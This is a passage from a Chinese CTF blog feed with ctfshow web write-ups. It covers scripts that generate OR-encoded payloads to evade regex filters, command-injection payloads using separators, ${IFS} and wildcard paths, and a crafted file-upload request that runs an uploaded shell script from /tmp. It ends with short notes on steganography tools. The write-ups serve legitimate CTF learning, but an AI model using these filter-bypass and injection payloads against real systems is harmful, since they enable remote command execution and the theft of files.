class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/4/26 18:56</span></span><br><span class="line"><span class="string">    @Describe</span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rce_or.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="comment"># 题目的正则表达式</span></span><br><span class="line">            pattern = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span></span><br><span class="line">            <span class="comment"># 如果当前外层循环元素被过滤了，直接跳过所有内层循环</span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(i)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 如果当前内层循环元素被过滤了，跳过该元素</span></span><br><span class="line">            <span class="keyword">if</span> re.search(pattern, <span class="built_in">chr</span>(j)):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># [2:]是因为python中hex表示是0xff这样的形式，去掉前面的0x，组成2位url编码</span></span><br><span class="line">            hex_i = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(i)[<span class="number">2</span>:] <span class="keyword">if</span> i &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            hex_j = <span class="string">&quot;0&quot;</span> + <span class="built_in">hex</span>(j)[<span class="number">2</span>:] <span class="keyword">if</span> j &lt; <span class="number">16</span> <span class="keyword">else</span> <span class="built_in">hex</span>(j)[<span class="number">2</span>:]</span><br><span class="line">            <span class="comment"># url编码的方式和ASCII码一样，但需要在前面加上%</span></span><br><span class="line">            url_i = <span class="string">&#x27;%&#x27;</span> + hex_i</span><br><span class="line">            url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">            <span class="comment"># c是我们要构造的参数，比如说我们要传ls命令，l就要拆分成a|b，其中|是因为题目没有过滤|，我们可以修改成其他任意操作</span></span><br><span class="line">            c = <span class="built_in">ord</span>(urllib.parse.unquote(url_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(url_j))</span><br><span class="line">            <span class="comment"># 如果c是可见的字符</span></span><br><span class="line">            <span class="keyword">if</span> c &gt;=<span class="number">32</span> <span class="keyword">and</span> c&lt;=<span class="number">126</span>:</span><br><span class="line">                f.write(<span class="built_in">chr</span>(c)+<span class="string">&quot; &quot;</span>+url_i+<span class="string">&quot; &quot;</span>+url_j+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后输入<code>python exp.py http://403c8935-1b28-4410-8d96-512661e9649f.challenge.ctf.show/</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] your function：system</span><br><span class="line">[+] your command：cat flag.php</span><br></pre></td></tr></table></figure><p>即可获取flag</p><p><a href="https://blog.csdn.net/qq_40345591/article/details/127773706">代码解析</a>，我们也可以利用ChatGPT为我们分析代码，然后debug看看怎么运行的。</p><h4><span id="命令截断">命令截断</span></h4><p>我们看一眼题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它意思是将命令全输出到**&#x2F;dev&#x2F;null**中，同时错误信息流也会被重定向到正确信息流中。</p><ul><li><strong>Linux系统支持的管道符如下：</strong><ol><li>“;”：执行完前面的语句再执行后面的语句。</li><li>“|”：显示后面语句的执行结果。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol></li></ul><p>这道题中我们可以用&amp;&amp;拼接，然后让后面执行的命令重定向到**&#x2F;dev&#x2F;null**中即可</p><ul><li>我们也可以用截断的方法，让后面重定向不起作用<ul><li>截断方法<code> ; , &amp;&amp; , %0a，||</code>等等，有很多截断方法</li></ul></li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 需要url编码</span><br><span class="line">/?c=ls&amp;&amp;ls</span><br><span class="line">?c=ls;</span><br><span class="line">?c=ls%<span class="number">0</span>a</span><br><span class="line">?c=tac flag.php;</span><br><span class="line">/?c=ta\c&lt;&gt;fla\g.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure><h4><span id="web54">web54</span></h4><ul><li><p>方法一</p><ul><li><p>屏蔽了大多数linux命令，但是我们还可以使用rev</p><p><code>/?c=rev$&#123;IFS&#125;fla?.php</code></p></li></ul></li><li><p>方法二</p><ul><li><p>虽然屏蔽了很多命令，但是我们只需在bin目录让命令补全就可以了</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/?<span class="built_in">at</span>$&#123;IFS&#125;f???????</span><br><span class="line">/bin/c??$&#123;IFS&#125;????????</span><br></pre></td></tr></table></figure></li></ul></li><li><p>方法三</p><ul><li>修改flag的名字，然后直接访问网页</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;t.txt</span><br><span class="line">t.txt</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web55">web55</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>方法一</p><ul><li><p>这题禁用了 字母 a-z ，那么我可以用 &#x2F;bin&#x2F;base64 flag.php</p><p>加上通配符 则为 &#x2F;???&#x2F;????64 ????.??? 然后他就会出现 flag.php内容的<a href="https://so.csdn.net/so/search?q=base64%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">base64编码</a></p></li></ul></li><li><p>方法二：</p><ul><li><p>还有一种做法，就是使用 &#x2F;usr&#x2F;bin&#x2F;bzip2 进行对文件的压缩</p><p>同样是使用通配符进行<a href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020">payload</a>， 然后 最后访问 &#x2F;flag.php.bz2进行下载压缩包</p><p><code>?c=/???/???/????2%20????.???</code></p></li></ul></li><li><p>方法三：</p><p>前提是 题目没有过滤 ? &#x2F; . (问号，斜杠,点)，就可以使用这个方法进行<a href="https://so.csdn.net/so/search?q=RCE&spm=1001.2101.3001.7020">RCE</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell</a></p><p><img src="/2023/04/19/ctfshow/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="glob通配符"></p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://43546a81-d8c7-4242-a8ea-dde142ff1d80.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本地访问并<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a>，上传1.php 写入</p><p><img src="/2023/04/19/ctfshow/c51ed151f2784287b539732dd5ff2699.png" alt="burpsuit"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">POST /?c=.%<span class="number">20</span>/???/????????[@-[] HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>fcec0ba-d4db-<span class="number">470</span>e-b611-<span class="number">1</span>f5455fea91c.challenge.ctf.show</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">319</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;.Not/A)Brand&quot;</span>;v=<span class="string">&quot;99&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;103&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;103&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaq9iIs9BT90tIPe6</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line"><span class="comment">cat flag.php.bz2</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryaq9iIs9BT90tIPe6--</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##/bin/sh</span></span><br><span class="line">cat  /<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"><span class="comment"># 因为上传的文件在tmp目录下</span></span><br></pre></td></tr></table></figure><p>这个目录是&#x2F;tmp，然后一般网页文件会命名为php??????，后面是随机的字母。所以我们需要规定一个范围[@-[],从@-[就是26个字母</p><p>然后关于上传文件的内容。既然要让我们上传的文件能执行我们的内容，所以我们添加内容&#x2F;bin&#x2F;sh</p><p>因为linux系统下一切皆文件，所以一些个内置程序都是由文件组成的。</p><p>&#x2F;bin目录下存放的都是协议shell脚本的内容，sh就是执行shell脚本，我们可以理解为打开终端。只有打开终端我们再能输入命令对吧</p><p>然后我们就可以在文件里面在添加ls,cat等一系列读取文件的命令了。</p><p>那么还差最后一步。我们上传了这个文件后那么它是存放在&#x2F;tmp目录下的某一个文件，但是它只是存放在了那里，并不会被执行。</p><p>这时候我们可以时候点命令，而正好题目并没有过滤点命令，点命令就是执行shell脚本</p><p>所以我们抓包，然后构造</p><p><strong>有概率失败，失败重试即可，因为最后一个字母不一定是大写的，记得修改右上角的port为80，然后https关了</strong></p><h1><span id="愚人节杯">愚人节杯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>查看浏览器发现url链接是base64加密。<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p><p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码，然后通过base64解密。</p><p><img src="/2023/04/19/ctfshow/image-20230419181149917.png" alt="image-20230419181149917"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj</title>
    <link href="https://disda-coding.github.io/2023/04/18/Buuoj/"/>
    <id>https://disda-coding.github.io/2023/04/18/Buuoj/</id>
    <published>2023-04-18T09:39:59.000Z</published>
    <updated>2023-04-19T00:19:24.239Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#misc">MISC</a><ul><li><a href="#%E9%87%91%E4%B8%89%E8%83%96">金三胖</a></li><li><a href="#%E4%BA%8C%E7%BB%B4%E7%A0%81">二维码</a></li></ul></li></ul><!-- tocstop --><h1><span id="misc">MISC</span></h1><h2><span id="金三胖">金三胖</span></h2><ul><li><p>工具：stegsolve</p></li><li><p>使用方法：使用 Analyse–&gt; frame browser查看</p></li></ul><h2><span id="二维码">二维码</span></h2><ul><li>工具：binwalk</li><li>使用方法 <code>binwalk -e qr.png</code>分离出两张图</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctf-b站笔记</title>
    <link href="https://disda-coding.github.io/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/"/>
    <id>https://disda-coding.github.io/2023/04/13/ctf-b%E7%AB%99%E7%AC%94%E8%AE%B0/</id>
    <published>2023-04-13T07:32:21.000Z</published>
    <updated>2023-04-19T00:26:44.637Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#b%E7%AB%99%E7%BD%91%E5%AE%89%E8%AF%BE%E7%A8%8B">B站网安课程</a></li><li><a href="#misc">Misc</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B8%8E%E9%9A%90%E5%86%99">文件操作与隐写</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB">文件类型识别</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%93%8D%E4%BD%9C">文件分离操作</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6%E6%93%8D%E4%BD%9C">文件合并操作</a></li></ul></li><li><a href="#%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99">图片隐写</a><ul><li><a href="#%E5%9B%BE%E7%89%87%E5%8A%A0%E5%AF%86">图片加密</a></li></ul></li><li><a href="#%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">压缩文件处理</a><ul><li><a href="#%E5%88%A4%E6%96%AD%E4%BB%80%E4%B9%88%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F">判断什么加密方式</a></li></ul></li><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">流量分析</a></li></ul></li><li><a href="#crypto">Crypto</a></li></ul><!-- tocstop --><h1><span id="b站网安课程">B站网安课程</span></h1><p><a href="https://www.processon.com/view/link/62b1b2267d9c08073c671315">学习路线图</a></p><h1><span id="misc">Misc</span></h1><h2><span id="文件操作与隐写">文件操作与隐写</span></h2><h3><span id="文件类型识别">文件类型识别</span></h3><ol><li>file命令<ul><li>使用场景：不知道后缀，无法打开文件</li></ul></li><li>winhex<ul><li>使用场景：windows下通过文件头信息判断文件类型</li></ul></li></ol><ul><li>遇到题目给个.png文件，但是打不开，通过<code>file</code>命令识别发现是data的情况，需要修复。<ul><li>通过010 Editor在文件加上对应头部就行。</li></ul></li></ul><ol start="3"><li><p>010 Editor</p><p>遇到都是16进制编码的文本，可以通过import hex导入。</p></li></ol><h3><span id="文件分离操作">文件分离操作</span></h3><ol><li><p>Binwalk工具</p><p>用法：</p><p>分析文件: binwalk filename</p><p>分离文件: binwalk -e filename</p></li><li><p>formost</p><ul><li>如果Binwalk没办法分离，可以使用它</li></ul><p>用法：</p><p>Foremost filename -o dir</p></li><li><p>dd</p><ul><li>如果是分块的话，前两个工具都不管用，就使用它把。</li></ul><p>用法：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span> =<span class="number">1</span>.txt of=<span class="number">4</span>.txt bs=<span class="number">5</span> count=<span class="number">3</span> skip=<span class="number">1</span></span><br><span class="line"># inputfile outputfile blocksize </span><br></pre></td></tr></table></figure><p>如果我们不知道文件分成几块合适的话，需要借助binwalk分析</p></li></ol><h3><span id="文件合并操作">文件合并操作</span></h3><ol><li><p>Linux下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 